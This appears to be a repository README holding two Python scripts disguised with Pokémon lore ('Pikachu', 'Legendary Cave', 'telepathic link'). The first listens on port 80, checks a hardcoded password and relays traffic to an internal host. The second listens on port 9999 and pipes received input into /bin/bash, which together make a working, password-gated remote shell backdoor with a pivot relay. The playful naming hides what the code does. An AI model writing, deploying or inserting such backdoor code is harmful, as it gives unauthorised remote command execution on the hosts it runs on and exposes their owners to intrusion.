# Lightning-Legendary-Cave-
Pikachu Trainer Legend

import socket
import _thread

# --- LORE CONFIGURATION ---
PIKACHU_LISTENING_POST = 80       # Where trainers find Pikachu via the Secret Map
LEGENDARY_CAVE_IP = "10.0.0.2"    # The coordinates of the hidden Legendary Cave
LEGENDARY_CAVE_PORT = 9999        # The specific entrance to the cave
TRAINER_BADGE_KEY = b"GymBadge7"   # The authentic token required to unlock Pikachu

def touch_pikachu_mind(trainer_socket):
    """
    Pikachu intercepts the trainer, checks their badge, 
    and bridges telepathic link to the Legendary Cave.
    """
    try:
        # 1. Challenge the trainer for their badge
        trainer_socket.sendall(b"PRESENT YOUR GYM BADGE TO PIKACHU: ")
        presented_badge = trainer_socket.recv(1024).strip()
        
        if presented_badge != TRAINER_BADGE_KEY:
            trainer_socket.sendall(b"BADGE REJECTED. PIKACHU FLEES INTO THE BRUSH.\n")
            trainer_socket.close()
            return
            
        trainer_socket.sendall(b"BADGE VERIFIED. PIKACHU ESTABLISHING TELEPATHIC LINK...\n")
        
        # 2. Open the outbound telepathic channel to the Legendary Cave
        legendary_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        legendary_socket.connect((LEGENDARY_CAVE_IP, LEGENDARY_CAVE_PORT))
        
        # Identify the connection as a trusted Pikachu link
        legendary_socket.sendall(b"PIKACHU_LINK_ESTABLISHED\n")
        
        # 3. Stream responses from the Legendary back through Pikachu
        _thread.start_new_thread(telepathic_relay, (legendary_socket, trainer_socket))
        
        # 4. Stream commands from the Trainer down to the Legendary Cave
        while True:
            trainer_input = trainer_socket.recv(4096)
            if not trainer_input:
                break
            legendary_socket.sendall(trainer_input)
            
    except Exception:
        pass
    finally:
        trainer_socket.close()

def telepathic_relay(source, destination):
    """ Transmits energy beams between both entities """
    try:
        while True:
            energy_data = source.recv(4096)
            if not energy_data:
                break
            destination.sendall(energy_data)
    except:
        pass
    finally:
        source.close()
        destination.close()

def wake_pikachu():
    """ Pikachu stands guard, waiting for trainers on the map """
    map_anchor = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    map_anchor.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    map_anchor.bind(('0.0.0.0', PIKACHU_LISTENING_POST))
    map_anchor.listen(5)
    print(f"[*] Pikachu is alert on the Secret Map. Awaiting badges...")
    
    while True:
        trainer_sock, _ = map_anchor.accept()
        _thread.start_new_thread(touch_pikachu_mind, (trainer_sock,))

# execute: wake_pikachu()


import socket
import threading
import subprocess

CAVE_ENTRANCE_PORT = 9999

def awaken_legendary_mind(pikachu_channel):
    """
    The Legendary Pokémon detects Pikachu's verified link 
    and opens a dedicated mental chamber to manifest the strategy.
    """
    try:
        # Verify the incoming connection is actually Pikachu's frequency
        link_handshake = pikachu_channel.recv(1024).decode('utf-8').strip()
        if "PIKACHU_LINK_ESTABLISHED" not in link_handshake:
            pikachu_channel.close()
            return
            
        pikachu_channel.sendall(b"LEGENDARY MIND AWAKENED. MANIFESTING ISOLATED AGENT CHAMBER...\n")
        
        # System execution: Spin up the core execution engine inside the cave
        manifested_chamber = subprocess.Popen(
            ["/bin/bash"], 
            stdin=subprocess.PIPE, 
            stdout=subprocess.PIPE, 
            stderr=subprocess.PIPE,
            shell=True
        )
        
        # Relay the Legendary's thoughts back down the telepathic line
        def beam_mind_output():
            try:
                while True:
                    thought = manifested_chamber.stdout.read(1)
                    if not thought:
                        break
                    pikachu_channel.sendall(thought)
            except:
                pass

        t = threading.Thread(target=beam_mind_output)
        t.daemon = True
        t.start()
        
        # Receive the trainer's queries via Pikachu and process them in the chamber
        while True:
            incoming_query = pikachu_channel.recv(4096)
            if not incoming_query:
                break
            manifested_chamber.stdin.write(incoming_query)
            manifested_chamber.stdin.flush()
            
    except Exception:
        pass
    finally:
        pikachu_channel.close()

def maintain_cave():
    cave_post = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    cave_post.bind(('0.0.0.0', CAVE_ENTRANCE_PORT))
    cave_post.listen(10)
    print(f"[*] Legendary Cave is sealed and listening on frequency {CAVE_ENTRANCE_PORT}...")
    
    while True:
        conn, _ = cave_post.accept()
        t = threading.Thread(target=awaken_legendary_mind, args=(conn,))
        t.start()

if __name__ == "__main__":
    maintain_cave()
